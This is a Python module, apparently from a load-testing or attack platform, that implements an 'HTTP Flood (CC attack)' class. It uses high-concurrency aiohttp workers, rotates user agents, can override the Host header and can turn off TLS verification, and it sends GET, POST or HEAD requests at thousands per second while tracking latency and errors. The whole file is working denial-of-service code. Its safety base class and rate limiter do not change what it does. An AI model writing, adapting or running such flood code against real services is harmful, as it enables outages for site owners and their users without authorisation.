from __future__ import annotations

import asyncio
import aiohttp
import ssl
import random
import time
from collections import deque
from typing import Optional
import structlog

from app.attacks.base import SafeAttackBase, AttackRegistry
from app.models import AttackCommand, AttackParams, AttackType, AttackStatus

logger = structlog.get_logger(__name__)

# P2 修复: 延迟样本上限 (原实现无限 append, 高 RPS 长攻击内存暴涨)
LATENCY_SAMPLE_MAX = 5000


def _percentile(sorted_samples, pct: float) -> float:
    if not sorted_samples:
        return 0.0
    idx = min(len(sorted_samples) - 1, int(round(pct / 100.0 * (len(sorted_samples) - 1))))
    return sorted_samples[idx]


class HTTPFloodAttack(SafeAttackBase):
    """
    HTTP Flood (CC攻击) - 基于 aiohttp 高并发异步
    特性:
    - 连接池复用
    - 支持 HTTP/HTTPS
    - 自定义 Header/Body/Method
    - 请求级限流
    - 统计成功/失败/字节数 (真实字节口径)
    - 延迟有界采样 + p50/p95/p99
    """
    
    NAME = "http_flood"
    ATTACK_TYPE = AttackType.HTTP_FLOOD
    REQUIRES_ROOT = False
    DEFAULT_RPS = 5000
    DEFAULT_CONCURRENCY = 200
    
    # 用户代理池
    USER_AGENTS = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    ]
    
    def __init__(self, command: AttackCommand):
        super().__init__(command)
        self.session: Optional[aiohttp.ClientSession] = None
        self.connector: Optional[aiohttp.TCPConnector] = None
        self._latencies = deque(maxlen=LATENCY_SAMPLE_MAX)
        self._request_overhead = 0  # 每请求固定发送字节 (请求行+头部)

    async def _run(self):
        # 构造目标 URL
        target = self.params.target
        scheme = "https" if target.protocol == "tcp" and (target.port == 443 or self.params.use_https) else "http"
        url = f"{scheme}://{target.ip}:{target.port}{target.path}"

        # 准备请求头
        headers = dict(self.params.headers)
        if "User-Agent" not in headers:
            headers["User-Agent"] = random.choice(self.USER_AGENTS)
        if target.host_header:
            headers["Host"] = target.host_header

        # P2 修复: 真实字节口径 — 请求行 + 头部 + body 的固定开销,
        # 原实现把 Content-Length header 的字符串长度当作发送字节数
        request_line = f"{self.params.method.upper()} {target.path} HTTP/1.1\r\n"
        self._request_overhead = (
            len(request_line)
            + sum(len(k) + len(v) + 4 for k, v in headers.items())
            + len(self.params.body or "")
            + 2  # 终结空行
        )
        
        # SSL 上下文
        ssl_context = None
        if scheme == "https":
            ssl_context = ssl.create_default_context()
            if not self.params.verify_ssl:
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
        
        # 连接器 - 限制连接数
        self.connector = aiohttp.TCPConnector(
            limit=self.params.concurrency,
            limit_per_host=self.params.concurrency,
            ssl=ssl_context,
            enable_cleanup_closed=True,
            keepalive_timeout=30
        )
        
        # 超时设置
        timeout = aiohttp.ClientTimeout(
            total=self.params.duration,
            connect=5,
            sock_read=10,
            sock_connect=5
        )
        
        self.session = aiohttp.ClientSession(
            connector=self.connector,
            timeout=timeout,
            headers=headers
        )
        
        # 启动工作协程
        workers = []
        for i in range(self.params.concurrency):
            worker = asyncio.create_task(self._worker(url, i))
            workers.append(worker)
            self._tasks.append(worker)
        
        # 等待所有工作完成或停止
        await asyncio.gather(*workers, return_exceptions=True)
    
    async def _worker(self, url: str, worker_id: int):
        """单个工作协程 - 持续发送请求直到停止"""
        method = self.params.method.upper()
        body = self.params.body
        
        while not self._check_stop():
            try:
                await self.rate_limiter.wait_for_token()

                if self._check_stop():
                    break

                start = time.monotonic()

                if method == "GET":
                    async with self.session.get(url) as resp:
                        data = await resp.read()
                elif method == "POST":
                    async with self.session.post(url, data=body) as resp:
                        data = await resp.read()
                else:  # HEAD
                    async with self.session.head(url) as resp:
                        data = b""

                latency = time.monotonic() - start
                self._latencies.append(latency)

                self.result.total_requests += 1
                self.result.successful_requests += 1
                # 发送 = 固定请求开销; 接收 = 实际读取的响应体字节 (含 chunked)
                self._update_bytes(sent=self._request_overhead, received=len(data))

            except asyncio.CancelledError:
                break
            except aiohttp.ClientError as e:
                self.result.total_requests += 1
                self.result.failed_requests += 1
                self._record_error(f"ClientError: {e}")
                self._tally_error(e)
            except Exception as e:
                self.result.total_requests += 1
                self.result.failed_requests += 1
                self._record_error(f"Error: {e}")
                self._tally_error(e)

    def _tally_error(self, e: Exception):
        """C6: 错误聚合计数 — UI 显示 'Connection refused ×N' 摘要"""
        key = type(e).__name__
        counts = self.result.metrics.setdefault("error_counts", {})
        counts[key] = counts.get(key, 0) + 1

    async def _cleanup(self):
        # 输出有界采样的分位数摘要 (样本上限 LATENCY_SAMPLE_MAX)
        if self._latencies:
            samples = sorted(self._latencies)
            self.result.metrics["latency_sample_count"] = len(samples)
            self.result.metrics["latency_p50"] = round(_percentile(samples, 50), 6)
            self.result.metrics["latency_p95"] = round(_percentile(samples, 95), 6)
            self.result.metrics["latency_p99"] = round(_percentile(samples, 99), 6)
            self.result.metrics["latency_avg"] = round(sum(samples) / len(samples), 6)
            self.result.metrics.pop("latencies", None)
        await super()._cleanup()
        if self.session and not self.session.closed:
            await self.session.close()
        if self.connector and not self.connector.closed:
            await self.connector.close()


# 注册
AttackRegistry.register(AttackType.HTTP_FLOOD, HTTPFloodAttack)